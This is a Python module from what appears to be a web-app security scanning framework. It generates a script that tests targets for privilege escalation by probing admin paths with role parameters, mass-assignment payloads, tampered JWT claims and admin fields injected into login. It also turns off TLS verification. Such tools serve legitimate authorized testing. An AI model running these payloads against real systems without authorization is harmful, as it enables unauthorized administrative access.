"""Privilege escalation testing tool."""

from workers.authorization.base_tool import AuthorizationTool
from workers.authorization.concurrency import WeightClass


class PrivilegeEscalationTester(AuthorizationTool):
    """Test for privilege escalation vulnerabilities (WSTG-AUTHZ-003)."""

    name = "privilege_escalation_tester"
    weight_class = WeightClass.HEAVY

    def build_command(self, target, credentials=None):
        target_url = getattr(target, 'target_value', str(target))
        base_url = target_url if target_url.startswith(('http://', 'https://')) else f"https://{target_url}"

        cred_json = "None"
        if credentials:
            import json as _j
            cred_json = _j.dumps(credentials)

        script = f'''
import httpx
import json
import sys
import base64

results = []
base_url = "{base_url}"
credentials = json.loads('{cred_json}') if '{cred_json}' != "None" else None

admin_paths = [
    "/admin",
    "/admin/dashboard",
    "/admin/users",
    "/admin/settings",
    "/admin/config",
    "/api/admin",
    "/api/admin/users",
    "/api/admin/settings",
    "/api/users",
    "/api/config",
    "/manage",
    "/manage/users",
    "/console",
    "/api/roles",
    "/api/permissions",
]

role_params = [
    {{"role": "admin"}},
    {{"role": "administrator"}},
    {{"is_admin": "true"}},
    {{"is_admin": "1"}},
    {{"admin": "true"}},
    {{"admin": "1"}},
    {{"user_type": "admin"}},
    {{"user_type": "administrator"}},
    {{"user_role": "admin"}},
    {{"permission": "admin"}},
    {{"permissions": "admin"}},
    {{"access_level": "999"}},
    {{"access_level": "admin"}},
    {{"level": "admin"}},
    {{"group": "admin"}},
    {{"group_id": "1"}},
]

mass_assignment_payloads = [
    {{"role": "admin", "is_admin": True}},
    {{"role": "admin", "permissions": ["read", "write", "delete", "admin"]}},
    {{"user_type": "admin", "access_level": 999}},
    {{"is_superuser": True}},
    {{"is_staff": True}},
    {{"admin": True}},
    {{"privileges": "admin"}},
    {{"account_type": "admin"}},
    {{"account_level": "admin"}},
]

def check_escalation(url, resp, test_type, payload_info, original_status=None):
    escalated = False
    severity = "medium"
    reason = ""

    if resp.status_code == 200:
        text_lower = resp.text.lower()
        if any(kw in text_lower for kw in ["admin", "manage", "settings", "users", "config", "role", "permission"]):
            escalated = True
            reason = "response contains admin/management keywords"
            severity = "high"
        elif len(resp.text) > 100:
            if original_status and original_status in [401, 403, 404]:
                escalated = True
                reason = f"previously blocked endpoint now returns 200 (was {{original_status}})"
                severity = "high"

    if resp.status_code in [200, 201] and original_status in [401, 403]:
        escalated = True
        reason = f"HTTP {{original_status}} bypassed to {{resp.status_code}}"
        severity = "critical"

    if escalated:
        results.append({{
            "title": f"Privilege escalation - {{test_type}}",
            "description": f"Potential privilege escalation via {{test_type}}: {{url}}",
            "severity": severity,
            "data": {{
                "url": url,
                "test_type": test_type,
                "payload": payload_info,
                "reason": reason,
                "status_code": resp.status_code,
                "content_length": len(resp.text)
            }}
        }})

try:
    client = httpx.Client(follow_redirects=True, timeout=10, verify=False)

    user_headers = {{"User-Agent": "WebAppBH-Authorization-Tester"}}
    if credentials and credentials.get("token"):
        user_headers["Authorization"] = "Bearer " + credentials["token"]

    for path in admin_paths:
        url = base_url + path

        try:
            blocked_resp = client.get(url, headers={{"User-Agent": "WebAppBH-Authorization-Tester"}})
            blocked_status = blocked_resp.status_code
        except Exception:
            blocked_status = None

        for role_param in role_params:
            try:
                resp = client.get(url, headers=user_headers, params=role_param)
                check_escalation(url, resp, "role_parameter_manipulation", str(role_param), blocked_status)
            except Exception:
                pass

            try:
                resp = client.post(url, headers=user_headers, data=role_param)
                check_escalation(url, resp, "role_parameter_manipulation_POST", str(role_param), blocked_status)
            except Exception:
                pass

            try:
                resp = client.post(url, headers=user_headers, json=role_param)
                check_escalation(url, resp, "role_json_manipulation", str(role_param), blocked_status)
            except Exception:
                pass

        for ma_payload in mass_assignment_payloads:
            try:
                resp = client.post(url, headers=user_headers, json=ma_payload)
                check_escalation(url, resp, "mass_assignment", str(ma_payload), blocked_status)
            except Exception:
                pass

            try:
                resp = client.put(url, headers=user_headers, json=ma_payload)
                check_escalation(url, resp, "mass_assignment_PUT", str(ma_payload), blocked_status)
            except Exception:
                pass

            try:
                resp = client.patch(url, headers=user_headers, json=ma_payload)
                check_escalation(url, resp, "mass_assignment_PATCH", str(ma_payload), blocked_status)
            except Exception:
                pass

    if credentials and credentials.get("token"):
        token = credentials["token"]
        try:
            parts = token.split(".")
            if len(parts) == 3:
                payload_b64 = parts[1]
                padding = 4 - len(payload_b64) % 4
                payload_b64 += "=" * padding
                payload = json.loads(base64.urlsafe_b64decode(payload_b64))

                if "role" in payload:
                    payload["role"] = "admin"
                if "is_admin" in payload:
                    payload["is_admin"] = True
                if "user_type" in payload:
                    payload["user_type"] = "admin"
                if "permissions" in payload:
                    payload["permissions"] = ["read", "write", "delete", "admin"]

                modified_payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
                modified_token = parts[0] + "." + modified_payload_b64 + "." + parts[2]

                modified_headers = dict(user_headers)
                modified_headers["Authorization"] = "Bearer " + modified_token

                for path in admin_paths:
                    url = base_url + path
                    try:
                        resp = client.get(url, headers=modified_headers)
                        check_escalation(url, resp, "jwt_role_manipulation", "modified JWT claims", blocked_status)
                    except Exception:
                        pass
        except Exception:
            pass

    if credentials and credentials.get("username") and credentials.get("password"):
        login_url = credentials.get("login_url", base_url + "/login")
        try:
            login_data = {{
                "username": credentials["username"],
                "password": credentials["password"],
                "role": "admin",
                "is_admin": "true",
                "user_type": "admin"
            }}
            resp = client.post(login_url, data=login_data, follow_redirects=True)
            if resp.status_code == 200:
                check_escalation(login_url, resp, "credential_escalation", str(login_data))
        except Exception:
            pass

    client.close()

except Exception as e:
    results.append({{
        "title": "Privilege escalation test error",
        "description": str(e),
        "severity": "info",
        "data": {{"error": str(e)}}
    }})

print(json.dumps(results))
'''
        return ["python3", "-c", script]

    def parse_output(self, stdout):
        import json
        try:
            return json.loads(stdout.strip())
        except (json.JSONDecodeError, ValueError):
            return []
